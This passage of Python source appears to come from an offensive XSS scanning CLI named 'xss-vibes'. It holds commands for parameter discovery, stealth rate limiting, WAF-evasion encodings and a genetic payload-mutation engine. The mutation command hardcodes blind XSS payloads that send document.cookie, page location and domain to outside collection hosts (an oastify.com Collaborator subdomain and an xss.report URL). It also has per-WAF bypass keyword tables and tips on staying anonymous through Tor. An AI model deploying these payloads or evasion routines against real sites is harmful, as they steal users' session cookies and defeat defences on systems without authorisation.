        click.echo("   pip3 install paramspider")


@cli.command("discover")
@click.argument("url")
@click.option("--arjun", is_flag=True, help="Use Arjun for parameter discovery")
@click.option(
    "--paramspider", is_flag=True, help="Use ParamSpider for archive collection"
)
@click.option("--proxy", help="Proxy URL")
@click.option("--burp", is_flag=True, help="Use Burp Suite proxy")
@click.option("--tor", is_flag=True, help="Use Tor proxy")
def discover_params(url, arjun, paramspider, proxy, burp, tor):
    """Discover parameters for a URL using various tools."""
    if not (arjun or paramspider):
        click.echo(
            f"{Fore.RED}❌ Please specify at least one tool: --arjun or --paramspider{Style.RESET_ALL}"
        )
        return

    # Setup configuration
    config = ScannerConfig(burp_proxy=burp, use_tor=tor)
    if proxy:
        config.proxy_http = proxy
        config.proxy_https = proxy

    param_discovery = ParameterDiscovery(config)

    click.echo(f"{Fore.CYAN}🔍 Discovering parameters for: {url}{Style.RESET_ALL}")

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        results = loop.run_until_complete(
            param_discovery.discover_all_parameters(url, use_archives=paramspider)
        )

        # Display results
        if results.get("arjun_params"):
            click.echo(f"\n{Fore.GREEN}🎯 Arjun Parameters:{Style.RESET_ALL}")
            for param in results["arjun_params"]:
                click.echo(f"   • {param}")

        if results.get("archive_urls"):
            click.echo(
                f"\n{Fore.GREEN}🕷️  Archive URLs ({len(results['archive_urls'])}):{Style.RESET_ALL}"
            )
            for archive_url in results["archive_urls"][:10]:
                click.echo(f"   • {archive_url}")
            if len(results["archive_urls"]) > 10:
                click.echo(f"   ... and {len(results['archive_urls']) - 10} more")

        if results.get("enhanced_targets"):
            click.echo(
                f"\n{Fore.GREEN}📈 Enhanced Targets ({len(results['enhanced_targets'])}):{Style.RESET_ALL}"
            )
            for target in results["enhanced_targets"][:10]:
                click.echo(f"   • {target}")
            if len(results["enhanced_targets"]) > 10:
                click.echo(f"   ... and {len(results['enhanced_targets']) - 10} more")

    except Exception as e:
        click.echo(f"{Fore.RED}❌ Discovery failed: {e}{Style.RESET_ALL}")


@cli.command("user-agents")
@click.option("--list", "list_uas", is_flag=True, help="List available User-Agents")
@click.option(
    "--type",
    "ua_type",
    type=click.Choice(["browser", "security", "bot", "all"]),
    default="browser",
    help="Type of User-Agents to show",
)
@click.option("--random", is_flag=True, help="Show a random User-Agent")
@click.option("--info", help="Analyze a User-Agent string")
def user_agents_cmd(list_uas, ua_type, random, info):
    """Manage and view User-Agent strings."""
    from .user_agents import UserAgentManager

    ua_manager = UserAgentManager()

    if info:
        # Analyze User-Agent
        ua_info = UserAgentManager.get_ua_info(info)
        click.echo(f"{Fore.CYAN}🔍 User-Agent Analysis:{Style.RESET_ALL}")
        click.echo(f"   Browser: {ua_info['browser']}")
        click.echo(f"   Platform: {ua_info['platform']}")
        click.echo(f"   Mobile: {'Yes' if ua_info['mobile'] else 'No'}")
        click.echo(f"   Bot: {'Yes' if ua_info['bot'] else 'No'}")
        click.echo(f"   Full UA: {info}")
        return

    if random:
        # Show random User-Agent
        random_ua = ua_manager.get_random_ua(ua_type if ua_type != "all" else "any")
        click.echo(
            f"{Fore.GREEN}🎲 Random {ua_type.title()} User-Agent:{Style.RESET_ALL}"
        )
        click.echo(f"   {random_ua}")
        return

    if list_uas:
        # List User-Agents
        click.echo(f"{Fore.CYAN}📋 Available User-Agents ({ua_type}):{Style.RESET_ALL}")

        if ua_type == "browser" or ua_type == "all":
            click.echo(
                f"\n{Fore.GREEN}🌐 Browser User-Agents ({len(ua_manager.BROWSER_USER_AGENTS)}):{Style.RESET_ALL}"
            )
            for i, ua in enumerate(ua_manager.BROWSER_USER_AGENTS[:10], 1):
                click.echo(f"   {i:2d}. {ua}")
            if len(ua_manager.BROWSER_USER_AGENTS) > 10:
                click.echo(
                    f"   ... and {len(ua_manager.BROWSER_USER_AGENTS) - 10} more"
                )

        if ua_type == "security" or ua_type == "all":
            click.echo(
                f"\n{Fore.RED}🔧 Security Tool User-Agents ({len(ua_manager.SECURITY_TOOL_USER_AGENTS)}):{Style.RESET_ALL}"
            )
            for i, ua in enumerate(ua_manager.SECURITY_TOOL_USER_AGENTS, 1):
                click.echo(f"   {i:2d}. {ua}")

        if ua_type == "bot" or ua_type == "all":
            click.echo(
                f"\n{Fore.YELLOW}🤖 Bot User-Agents ({len(ua_manager.BOT_USER_AGENTS)}):{Style.RESET_ALL}"
            )
            for i, ua in enumerate(ua_manager.BOT_USER_AGENTS, 1):
                click.echo(f"   {i:2d}. {ua}")

        return

    # Default: show summary
    click.echo(f"{Fore.CYAN}🔧 User-Agent Manager{Style.RESET_ALL}")
    click.echo(f"   Browser UAs: {len(ua_manager.BROWSER_USER_AGENTS)}")
    click.echo(f"   Security Tool UAs: {len(ua_manager.SECURITY_TOOL_USER_AGENTS)}")
    click.echo(f"   Bot UAs: {len(ua_manager.BOT_USER_AGENTS)}")
    click.echo(f"\nUse --list to see all User-Agents")
    click.echo(f"Use --random to get a random User-Agent")


@cli.command("rate-limiting")
def rate_limiting_help():
    """Show rate limiting and stealth options."""

    title = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                           🚦 RATE LIMITING & STEALTH                          ║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}Available Rate Limiting Modes:{Style.RESET_ALL}

{Fore.GREEN}🕶️  Stealth Mode (--stealth){Style.RESET_ALL}
   • Extremely slow scanning (2-8 seconds between requests)
   • Random jitter and delays to mimic human behavior
   • Adaptive timing based on server responses
   • Best for bypassing advanced WAFs and rate limiting
   • Usage: xss-vibes scan --stealth <url>

{Fore.RED}🚀 Aggressive Mode (--aggressive){Style.RESET_ALL}
   • Fast scanning (up to 15 req/s)
   • Minimal delays, optimized for speed
   • Suitable for internal testing or less protected targets
   • Usage: xss-vibes scan --aggressive <url>

{Fore.CYAN}⚡ Custom Rate Limiting (--rate-limit){Style.RESET_ALL}
   • Set specific requests per second (e.g., --rate-limit 5.0)
   • Configurable adaptive timing and jitter
   • Balance between speed and stealth
   • Usage: xss-vibes scan --rate-limit 3.0 --adaptive --jitter <url>

{Fore.MAGENTA}🎯 Advanced Options:{Style.RESET_ALL}
   • --adaptive        Enable adaptive timing based on responses
   • --jitter          Add random timing variations
   • --min-delay N     Minimum delay in stealth mode (seconds)
   • --max-delay N     Maximum delay in stealth mode (seconds)

{Fore.YELLOW}Examples:{Style.RESET_ALL}

   # Ultra stealth mode
   xss-vibes scan --stealth --jitter https://target.com

   # Custom balanced approach
   xss-vibes scan --rate-limit 2.0 --adaptive --jitter https://target.com
   
   # Fast aggressive scan
   xss-vibes scan --aggressive https://target.com

   # Custom stealth with longer delays
   xss-vibes scan --stealth --min-delay 5 --max-delay 15 https://target.com

{Fore.GREEN}💡 Pro Tips:{Style.RESET_ALL}
   • Use stealth mode for heavily protected targets
   • Combine with proxy (--burp or --tor) for maximum anonymity
   • Monitor scan output for rate limiting warnings
   • Adaptive timing automatically adjusts based on server responses
"""

    click.echo(title)


@cli.command("encoding")
@click.option("--analyze", help="Analyze encoding potential of a specific payload")
@click.option("--test-payload", help="Test payload with all encoding techniques")
@click.option(
    "--list-encodings", is_flag=True, help="List all available encoding types"
)
@click.option("--demo", is_flag=True, help="Show encoding demonstration")
def encoding_cmd(analyze, test_payload, list_encodings, demo):
    """Advanced encoding techniques for WAF evasion."""

    if list_encodings:
        from .encoding_engine import EncodingType

        click.echo(f"{Fore.CYAN}🔐 Available Encoding Types:{Style.RESET_ALL}\n")

        encoding_descriptions = {
            "url": "Standard URL encoding (%20, %3C, etc.)",
            "double_url": "Double URL encoding (%253C, %2520, etc.)",
            "html": "HTML entity encoding (&lt;, &gt;, &#x3C;, etc.)",
            "unicode": "Unicode escape sequences (\\u003C, \\u003E, etc.)",
            "hex": "Hexadecimal encoding (\\x3C, \\x3E, etc.)",
            "octal": "Octal encoding (\\074, \\076, etc.)",
            "base64": "Base64 encoding with eval wrapper",
            "utf7": "UTF-7 encoding for IE/Edge bypass",
            "utf16": "UTF-16 encoding",
            "json": "JSON Unicode escapes",
            "css": "CSS character encoding (\\3C, \\3E, etc.)",
            "js": "JavaScript string encoding",
            "mixed": "Mixed case obfuscation",
            "char_sub": "Character entity substitution",
            "comments": "HTML/JS comment insertion",
            "whitespace": "Whitespace character substitution",
            "concat": "String concatenation",
            "eval": "Dynamic evaluation wrapper",
            "fromcharcode": "String.fromCharCode encoding",
        }

        for enc_type, description in encoding_descriptions.items():
            click.echo(
                f"   {Fore.GREEN}{enc_type:<12}{Style.RESET_ALL} - {description}"
            )

        click.echo(f"\n{Fore.YELLOW}Usage Examples:{Style.RESET_ALL}")
        click.echo("   xss-vibes scan --encoding --encoding-types unicode,base64 <url>")
        click.echo("   xss-vibes scan --high-evasion <url>")
        click.echo("   xss-vibes scan --context-aware <url>")

    elif analyze:
        from .payload_manager import PayloadManager

        payload_manager = PayloadManager()
        analysis = payload_manager.analyze_payload_evasion_potential(analyze)

        click.echo(f"{Fore.CYAN}🔍 Payload Evasion Analysis:{Style.RESET_ALL}\n")
        click.echo(f"Original: {analysis['original_payload']}")
        click.echo(f"WAF Bypass Score: {analysis['waf_bypass_score']}/10")

        char_analysis = analysis["character_analysis"]
        click.echo(f"\n{Fore.YELLOW}Character Analysis:{Style.RESET_ALL}")
        click.echo(
            f"   Dangerous characters: {', '.join(char_analysis['dangerous_characters']) if char_analysis['dangerous_characters'] else 'None'}"
        )
        click.echo(f"   Danger score: {char_analysis['danger_score']:.1f}/10")
        click.echo(
            f"   Requires encoding: {'Yes' if char_analysis['requires_encoding'] else 'No'}"
        )

        click.echo(f"\n{Fore.GREEN}Best Encoding Techniques:{Style.RESET_ALL}")
        for i, encoding in enumerate(analysis["best_encodings"][:5], 1):
            click.echo(
                f"   {i}. {encoding['encoding']} (Score: {encoding['bypass_potential']}/10)"
            )
            click.echo(f"      {encoding['description']}")

    elif test_payload:
        from .encoding_engine import advanced_encoder, EncodingType

        click.echo(f"{Fore.CYAN}🧪 Encoding Test Results:{Style.RESET_ALL}\n")
        click.echo(f"Original: {test_payload}\n")

        # Test with selected high-impact encodings
        test_encodings = [
            EncodingType.UNICODE,
            EncodingType.BASE64,
            EncodingType.FROMCHARCODE,
            EncodingType.UTF7,
            EncodingType.DOUBLE_URL,
        ]

        for encoding_type in test_encodings:
            try:
                result = advanced_encoder.encode_payload(test_payload, encoding_type)
                click.echo(f"{Fore.GREEN}{encoding_type.value}:{Style.RESET_ALL}")
                click.echo(f"   {result.encoded}")
                click.echo(f"   Bypass Potential: {result.waf_bypass_potential}/10")
                click.echo(f"   Complexity: {result.complexity}/10\n")
            except Exception as e:
                click.echo(
                    f"{Fore.RED}{encoding_type.value}: Failed - {e}{Style.RESET_ALL}\n"
                )

    elif demo:
        demo_payload = "<script>alert('XSS')</script>"

        click.echo(f"{Fore.CYAN}🎭 Encoding Demonstration:{Style.RESET_ALL}\n")
        click.echo(f"Demo payload: {demo_payload}\n")

        from .encoding_engine import generate_evasion_variants

        variants = generate_evasion_variants(demo_payload, count=5)

        for i, variant in enumerate(variants, 1):
            click.echo(
                f"{Fore.YELLOW}Variant {i} ({variant.encoding_type.value}):{Style.RESET_ALL}"
            )
            click.echo(f"   {variant.encoded}")
            click.echo(f"   Bypass Potential: {variant.waf_bypass_potential}/10")
            click.echo(f"   Description: {variant.description}\n")

    else:
        # Show general help
        title = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                           🔐 ADVANCED ENCODING ENGINE                         ║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.YELLOW}Advanced WAF Evasion Techniques:{Style.RESET_ALL}

{Fore.GREEN}🎯 High-Evasion Mode (--high-evasion){Style.RESET_ALL}
   • Uses only the most effective bypass techniques
   • Combines multiple encoding layers
   • Targets specific WAF weaknesses
   • Usage: xss-vibes scan --high-evasion <url>

{Fore.BLUE}🧠 Context-Aware Encoding (--context-aware){Style.RESET_ALL}
   • Detects injection context automatically
   • Applies context-specific encoding techniques
   • Optimizes for HTML attributes, JavaScript, CSS, etc.
   • Usage: xss-vibes scan --context-aware <url>

{Fore.MAGENTA}⚙️  Custom Encoding (--encoding){Style.RESET_ALL}
   • Manual control over encoding techniques
   • Specify exact encoding types to use
   • Configure number of variants per payload
   • Usage: xss-vibes scan --encoding --encoding-types unicode,base64 <url>

{Fore.CYAN}Available Commands:{Style.RESET_ALL}
   encoding --list-encodings     Show all encoding types
   encoding --analyze "payload"  Analyze payload evasion potential  
   encoding --test-payload "x"   Test payload with encodings
   encoding --demo               Show encoding demonstration

{Fore.GREEN}💡 Pro Tips:{Style.RESET_ALL}
   • Combine with stealth mode for maximum evasion
   • Use context-aware for targeted injection points
   • High-evasion mode for heavily protected targets
   • Mix different encoding types for better results
"""

        click.echo(title)


@cli.command("mutation")
@click.option("--payload", required=True, help="Base payload for mutation")
@click.option(
    "--context",
    type=click.Choice(
        [
            "html_text",
            "html_attribute",
            "javascript_string",
            "url_parameter",
            "attr_double",
            "attr_single",
            "js_string",
        ]
    ),
    default="html_text",
    help="Injection context",
)
@click.option(
    "--generations", type=int, default=5, help="Number of evolution generations"
)
@click.option(
    "--population", type=int, default=20, help="Population size for genetic algorithm"
)
@click.option(
    "--variants", type=int, default=10, help="Number of mutation variants to generate"
)
@click.option(
    "--waf",
    type=click.Choice(
        [
            "cloudflare",
            "akamai",
            "imperva",
            "f5",
            "barracuda",
            "sucuri",
            "modsecurity",
            "wordfence",
            "aws-waf",
        ]
    ),
    help="Target specific WAF for optimized mutations",
)
@click.option(
    "--score-min",
    type=float,
    default=0.0,
    help="Minimum confidence score for mutations (0.0-1.0)",
)
@click.option("--blind", is_flag=True, help="Generate blind XSS optimized payloads")
@click.option(
    "--colab",
    is_flag=True,
    help="Use Burp Collaborator server (817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com)",
)
@click.option(
    "--blind-server",
    type=click.Choice(["xss.report", "burp", "custom"]),
    default="xss.report",
    help="Blind XSS server: xss.report (default), burp (your collaborator), or custom",
)
@click.option(
    "--custom-server",
    help="Custom blind XSS server URL (when using --blind-server custom)",
)
@click.option("--cache-dir", help="Cache directory to avoid re-mutating same payloads")
@click.option("--save", help="Save results to file")
def mutation_cmd(
    payload,
    context,
    generations,
    population,
    variants,
    waf,
    score_min,
    blind,
    colab,
    blind_server,
    custom_server,
    cache_dir,
    save,
):
    """Intelligent payload mutation using genetic algorithms with advanced WAF-aware optimization."""
    import hashlib
    import os
    import json
    from pathlib import Path

    click.echo(f"{Fore.CYAN}🧬 Advanced Payload Mutation Engine{Style.RESET_ALL}")

    # Display configuration
    if waf:
        click.echo(f"{Fore.YELLOW}🛡️  WAF Target: {waf.upper()}{Style.RESET_ALL}")
    if blind:
        click.echo(f"{Fore.MAGENTA}👁️  Blind XSS Mode: Enabled{Style.RESET_ALL}")
    if score_min > 0:
        click.echo(f"{Fore.BLUE}⭐ Score Filter: ≥{score_min}{Style.RESET_ALL}")
    if cache_dir:
        click.echo(f"{Fore.GREEN}💾 Cache: {cache_dir}{Style.RESET_ALL}")
    click.echo()

    try:
        # Cache implementation
        cache_file = None
        if cache_dir:
            cache_path = Path(cache_dir)
            cache_path.mkdir(parents=True, exist_ok=True)

            # Create cache key from payload + context + waf + blind
            cache_key = hashlib.md5(
                f"{payload}:{context}:{waf}:{blind}".encode()
            ).hexdigest()
            cache_file = cache_path / f"mutation_{cache_key}.json"

            if cache_file.exists():
                click.echo(
                    f"{Fore.GREEN}📋 Loading cached mutations...{Style.RESET_ALL}"
                )
                with open(cache_file, "r") as f:
                    cached_data = json.load(f)

                # Filter by score if needed
                cached_results = cached_data.get("variants", [])
                if score_min > 0:
                    cached_results = [
                        r for r in cached_results if r["score"] >= score_min
                    ]

                if cached_results:
                    click.echo(
                        f"{Fore.GREEN}✅ Found {len(cached_results)} cached mutations{Style.RESET_ALL}"
                    )

                    for result in cached_results[:variants]:
                        click.echo(
                            f"{Fore.GREEN}Variant {result['variant']}:{Style.RESET_ALL}"
                        )
                        click.echo(f"  Payload: {result['payload']}")
                        click.echo(f"  Score: {result['score']:.3f}")
                        click.echo(f"  Mutations: {', '.join(result['mutations'])}")
                        click.echo()

                    if save:
                        with open(save, "w") as f:
                            json.dump(
                                {
                                    "original": payload,
                                    "context": context,
                                    "waf": waf,
                                    "blind": blind,
                                    "variants": cached_results[:variants],
                                },
                                f,
                                indent=2,
                            )
                        click.echo(
                            f"{Fore.GREEN}✅ Results saved to {save}{Style.RESET_ALL}"
                        )

                    return

        # Initialize mutation engine
        mutation_engine = PayloadMutationEngine()

        # Enhanced context mapping with new contexts
        context_map = {
            "html_text": InjectionContext.HTML_CONTENT,
            "html_attribute": InjectionContext.HTML_ATTRIBUTE,
            "javascript_string": InjectionContext.JAVASCRIPT_STRING,
            "url_parameter": InjectionContext.URL_PARAMETER,
            "attr_double": InjectionContext.HTML_ATTRIBUTE,
            "attr_single": InjectionContext.HTML_ATTRIBUTE,
            "js_string": InjectionContext.JAVASCRIPT_STRING,
        }

        injection_context = context_map.get(context, InjectionContext.HTML_CONTENT)

        click.echo(f"Original payload: {payload}")
        click.echo(f"Context: {context}")

        # Blind XSS payload optimization
        if blind:
            # Determine blind server
            if colab:
                server_url = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"
                click.echo(
                    f"{Fore.BLUE}🔗 Using Burp Collaborator: {server_url}{Style.RESET_ALL}"
                )
            elif blind_server == "burp":
                server_url = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"
                click.echo(
                    f"{Fore.BLUE}🔗 Using Burp Collaborator: {server_url}{Style.RESET_ALL}"
                )
            elif blind_server == "custom" and custom_server:
                server_url = custom_server
                click.echo(
                    f"{Fore.BLUE}🔗 Using Custom Server: {server_url}{Style.RESET_ALL}"
                )
            else:
                server_url = "https://xss.report/c/terafos"
                click.echo(
                    f"{Fore.BLUE}🔗 Using XSS.Report: {server_url}{Style.RESET_ALL}"
                )

            # Auto-detect if payload already contains collaborator domain
            if "oastify.com" in payload or "burpcollaborator" in payload.lower():
                server_url = "https://817gq2xsaa0oidkzkpg524yk7bd21sph.oastify.com"
                click.echo(
                    f"{Fore.YELLOW}🔄 Auto-detected Collaborator domain in payload{Style.RESET_ALL}"
                )

            blind_payloads = [
                f"<script>new Image().src='{server_url}?'+document.cookie</script>",
                f"<img src=x onerror='new Image().src=\"{server_url}?c=\"+document.cookie'>",
                f"<svg/onload='fetch(\"{server_url}?d=\"+document.domain)'>",
                f"<iframe src='javascript:new Image().src=\"{server_url}?l=\"+location.href'></iframe>",
                f"<body onload='navigator.sendBeacon(\"{server_url}\",document.cookie)'>",
                f"<details ontoggle='new Image().src=\"{server_url}?dt=\"+document.title' open>",
                f'<input onfocus=\'eval("new Image().src=\\"{server_url}?f=\\"+location.href")\' autofocus>',
                f"<video><source onerror=\"new Image().src='{server_url}?v='+btoa(document.domain)\">",
                f"<audio onerror=\"fetch('{server_url}?a='+encodeURIComponent(location.href))\">",
            ]

            # Replace alert/confirm with blind detection
            if "alert" in payload or "confirm" in payload or "prompt" in payload:
                import re

                payload = re.sub(
                    r"alert\([^)]*\)", f'new Image().src="{server_url}"', payload
                )
                payload = re.sub(
                    r"confirm\([^)]*\)", f'new Image().src="{server_url}"', payload
                )
                payload = re.sub(
                    r"prompt\([^)]*\)", f'new Image().src="{server_url}"', payload
                )

            click.echo(f"{Fore.MAGENTA}🔍 Blind XSS payload optimized{Style.RESET_ALL}")

        # WAF-specific mutations
        waf_optimizations = {}
        if waf == "cloudflare":
            waf_optimizations = {
                "avoid_keywords": ["script", "javascript", "vbscript", "onclick"],
                "prefer_encodings": ["html_entity", "url_encode"],
                "bypass_patterns": ["/**/", "<!--", "-->"],
            }
        elif waf == "akamai":
            waf_optimizations = {
                "avoid_keywords": ["eval", "document", "window"],
                "prefer_encodings": ["unicode", "hex"],
                "bypass_patterns": ["\x00", "\x09", "\x0a"],
            }
        elif waf == "imperva":
            waf_optimizations = {
                "avoid_keywords": ["cookie", "location", "href"],
                "prefer_encodings": ["base64", "unicode"],
                "bypass_patterns": ["\\\\", "\\u", "\\x"],
            }

        click.echo(
            f"Generating {variants} variants with {generations} generations...\n"
        )

        # Generate mutations
        mutations = mutation_engine.mutate_payload(
            payload, injection_context, intensity=variants
        )

        # Apply WAF-specific filtering and optimization
        if waf and waf in ["cloudflare", "akamai", "imperva"]:
            optimized_mutations = []
            for mutation in mutations:
                should_skip = False

                # Check if payload contains avoided keywords
                if "avoid_keywords" in waf_optimizations:
                    for keyword in waf_optimizations["avoid_keywords"]:
                        if keyword.lower() in mutation.mutated_payload.lower():
                            mutation.confidence_score *= 0.7  # Reduce score

                optimized_mutations.append(mutation)

            mutations = optimized_mutations
            click.echo(
                f"{Fore.YELLOW}🛡️  Applied {waf.upper()} WAF optimizations{Style.RESET_ALL}"
            )

        # Filter by minimum score
        if score_min > 0:
            original_count = len(mutations)
            mutations = [m for m in mutations if m.confidence_score >= score_min]
            filtered_count = len(mutations)
            click.echo(
                f"{Fore.BLUE}⭐ Score filter: {original_count} → {filtered_count} mutations{Style.RESET_ALL}"
            )

        # Limit to requested variants
        mutations = mutations[:variants]

        results = []
        for i, mutation in enumerate(mutations, 1):
            click.echo(f"{Fore.GREEN}Variant {i}:{Style.RESET_ALL}")
            click.echo(f"  Payload: {mutation.mutated_payload}")
            click.echo(f"  Score: {mutation.confidence_score:.3f}")
            click.echo(
                f"  Mutations: {', '.join([m.value for m in mutation.mutations_applied])}"
            )
            if waf:
                click.echo(f"  WAF: Optimized for {waf.upper()}")
            if blind:
                click.echo(f"  Type: Blind XSS")
            click.echo()

            results.append(
                {
                    "variant": i,
                    "payload": mutation.mutated_payload,
                    "score": mutation.confidence_score,
                    "mutations": [m.value for m in mutation.mutations_applied],
                    "waf_optimized": waf is not None,
                    "blind_xss": blind,
                }
            )

        # Cache results
        if cache_file:
            cache_data = {
                "original": payload,
                "context": context,
                "waf": waf,
                "blind": blind,
                "generated_at": str(Path().cwd()),
                "variants": results,
            }
            with open(cache_file, "w") as f:
                json.dump(cache_data, f, indent=2)
            click.echo(
                f"{Fore.GREEN}💾 Results cached to {cache_file}{Style.RESET_ALL}"
            )

        # Save results if requested
        if save:
            output_data = {
                "original": payload,
                "context": context,
                "waf": waf,
                "blind": blind,
                "score_min": score_min,
                "variants": results,
            }

            with open(save, "w") as f:
                json.dump(output_data, f, indent=2)
            click.echo(f"{Fore.GREEN}✅ Results saved to {save}{Style.RESET_ALL}")

        # Summary
        click.echo(f"\n{Fore.CYAN}📊 Mutation Summary:{Style.RESET_ALL}")
        click.echo(f"  Generated: {len(results)} variants")
        if score_min > 0:
            avg_score = (
                sum(r["score"] for r in results) / len(results) if results else 0
            )
            click.echo(f"  Average Score: {avg_score:.3f}")
        if waf:
            click.echo(f"  WAF Optimized: {waf.upper()}")
        if blind:
            click.echo(f"  Blind XSS: Enabled")

    except Exception as e:
        click.echo(f"{Fore.RED}❌ Mutation failed: {e}{Style.RESET_ALL}")
        import traceback

        click.echo(f"{Fore.RED}Debug: {traceback.format_exc()}{Style.RESET_ALL}")


@cli.command("session")
@click.option("--login-url", required=True, help="Login URL")
@click.option("--username", required=True, help="Username")
@click.option("--password", required=True, help="Password")
@click.option(
    "--auth-type",
    type=click.Choice(["form", "basic", "digest"]),
    default="form",
    help="Authentication type",
)
@click.option("--test-url", help="URL to test authenticated access")
@click.option("--save-profile", help="Save session profile to file")
def session_cmd(login_url, username, password, auth_type, test_url, save_profile):
    """Test and manage authentication sessions."""

    click.echo(f"{Fore.CYAN}🔐 Session Management{Style.RESET_ALL}\n")

    try:
        # Setup session manager
        session_config = SessionConfig()
        session_manager = SessionManager(session_config)

        # Create credentials
        credentials = LoginCredentials(
            username=username, password=password, login_url=login_url
        )

        auth_method = AuthMethod(type=auth_type, credentials=credentials)

        # Attempt authentication
        click.echo(f"Authenticating with {auth_type} method...")
        if session_manager.authenticate(auth_method):
            click.echo(f"{Fore.GREEN}✅ Authentication successful{Style.RESET_ALL}")

            # Test authenticated access
            if test_url:
                click.echo(f"\nTesting authenticated access to {test_url}...")
                response = session_manager.make_authenticated_request("GET", test_url)
                click.echo(f"Status: {response.status_code}")
                click.echo(f"Response length: {len(response.text)} bytes")

            # Show session info
            session_info = session_manager.get_session_info()
            click.echo(f"\n{Fore.CYAN}Session Information:{Style.RESET_ALL}")
            for key, value in session_info.items():
                click.echo(f"  {key}: {value}")

            # Save profile if requested
            if save_profile:
                # This would save to session profile manager
                click.echo(
                    f"{Fore.GREEN}✅ Profile saving not yet implemented{Style.RESET_ALL}"
                )

        else:
            click.echo(f"{Fore.RED}❌ Authentication failed{Style.RESET_ALL}")

    except Exception as e:
        click.echo(f"{Fore.RED}❌ Session error: {e}{Style.RESET_ALL}")
    finally:
        if "session_manager" in locals():
            session_manager.close()


@cli.command("pattern-list")
@click.option(
    "--type",
    "pattern_type",
    type=click.Choice(
        [
            "xss_detection",
            "waf_bypass",
            "context_injection",
            "parameter_discovery",
            "payload_selection",
            "vulnerability_validation",
        ]
    ),
    help="Filter patterns by type",
)
def pattern_list_cmd(pattern_type):
    """List available XSS detection patterns."""
    from .advanced_patterns import AdvancedPatternEngine

    click.echo(f"{Fore.CYAN}🎯 XSS Vibes - Advanced Patterns{Style.RESET_ALL}")
    click.echo("=" * 50)

    engine = AdvancedPatternEngine()
    from .advanced_patterns import PatternType

    ptype = PatternType(pattern_type) if pattern_type else None
    patterns = engine.list_patterns(ptype)

    click.echo(f"\n📋 Found {len(patterns)} patterns")

    for pattern in patterns:
        click.echo(f"\n{Fore.GREEN}• {pattern.name}{Style.RESET_ALL}")
        click.echo(f"  Type: {pattern.pattern_type.value}")
        click.echo(f"  Priority: {pattern.priority}")
        click.echo(f"  WAF Targets: {', '.join(pattern.waf_targets)}")
        click.echo(f"  Description: {pattern.description}")

        if pattern.examples:
            click.echo(
                f"  Examples: {Fore.YELLOW}{', '.join(pattern.examples[:2])}{Style.RESET_ALL}"
            )


@cli.command("pattern-match")
@click.option("--text", required=True, help="Text to match against patterns")
@click.option(
    "--type",
    "pattern_type",
    type=click.Choice(
        [
            "xss_detection",
            "waf_bypass",
            "context_injection",
            "parameter_discovery",
            "payload_selection",
            "vulnerability_validation",
        ]
    ),
    help="Filter by pattern type",
)
@click.option("--waf", help="Target WAF type")
@click.option("--min-priority", type=int, default=0, help="Minimum pattern priority")
def pattern_match_cmd(text, pattern_type, waf, min_priority):
    """Match text against XSS patterns."""
    from .advanced_patterns import AdvancedPatternEngine, PatternType

    click.echo(f"{Fore.CYAN}🔍 Pattern Matching Analysis{Style.RESET_ALL}")
    click.echo("=" * 50)

    engine = AdvancedPatternEngine()
    ptype = PatternType(pattern_type) if pattern_type else None

    matches = engine.match_patterns(
        text, pattern_type=ptype, waf_target=waf, min_priority=min_priority
    )

    if matches:
        click.echo(f"\n✅ Found {len(matches)} pattern matches:")

        for match in matches:
            click.echo(f"\n{Fore.GREEN}📍 {match['pattern_name']}{Style.RESET_ALL}")
            click.echo(f"   Type: {match['pattern_type']}")
            click.echo(f"   Priority: {match['priority']}")
            click.echo(f"   Matches: {match['match_count']}")
            click.echo(f"   WAF Targets: {', '.join(match['waf_targets'])}")
            click.echo(f"   Description: {match['description']}")

            if match["matches"]:
                click.echo(
                    f"   {Fore.YELLOW}Matched strings: {', '.join(str(m) for m in match['matches'][:3])}{Style.RESET_ALL}"
                )
    else:
        click.echo(f"{Fore.YELLOW}⚠️  No patterns matched{Style.RESET_ALL}")


@cli.command("pattern-suggest")
@click.option("--response", required=True, help="Response text to analyze")
@click.option("--context", help="Injection context hint")
@click.option("--waf", help="Target WAF type")
def pattern_suggest_cmd(response, context, waf):
    """Suggest payloads based on response analysis."""
    from .advanced_patterns import AdvancedPatternEngine

    click.echo(f"{Fore.CYAN}💡 Payload Suggestions{Style.RESET_ALL}")
    click.echo("=" * 50)

    engine = AdvancedPatternEngine()
    suggestions = engine.suggest_payloads(response, context, waf)

    if suggestions:
        click.echo(f"\n📝 Suggested payload types ({len(suggestions)} suggestions):")
        for suggestion in suggestions:
            click.echo(f"  {Fore.GREEN}• {suggestion}{Style.RESET_ALL}")
    else:
        click.echo(f"{Fore.YELLOW}⚠️  No specific suggestions found{Style.RESET_ALL}")

    # Also show reflection analysis
    click.echo(f"\n{Fore.CYAN}🔍 Response Analysis:{Style.RESET_ALL}")
    matches = engine.match_patterns(response)

    if matches:
        click.echo(f"  Detected patterns: {len(matches)}")
        for match in matches[:3]:  # Show top 3
            click.echo(
                f"    • {match['pattern_name']} ({match['match_count']} matches)"
            )
    else:
        click.echo("  No XSS patterns detected in response")


@cli.command("pattern-analyze")
@click.option("--payload", required=True, help="Payload to analyze")
@click.option("--response", required=True, help="Response text")
def pattern_analyze_cmd(payload, response):
    """Analyze payload reflection in response."""
    from .advanced_patterns import AdvancedPatternEngine

    click.echo(f"{Fore.CYAN}🔬 Reflection Analysis{Style.RESET_ALL}")
    click.echo("=" * 50)

    engine = AdvancedPatternEngine()
    analysis = engine.analyze_reflection(payload, response)

    click.echo(f"\n📋 Analysis Results:")
    click.echo(f"  Payload: {Fore.YELLOW}{payload}{Style.RESET_ALL}")
    click.echo(
        f"  Reflected: {Fore.GREEN if analysis['reflected'] else Fore.RED}{analysis['reflected']}{Style.RESET_ALL}"
    )
    click.echo(f"  Reflection Count: {analysis['reflection_count']}")
    click.echo(f"  Bypass Potential: {analysis['filter_bypass_potential']}/10")

    if analysis["reflection_contexts"]:
        click.echo(f"  Contexts: {', '.join(analysis['reflection_contexts'])}")

    if analysis["encoding_detected"]:
        click.echo(f"  Encoding: {', '.join(analysis['encoding_detected'])}")

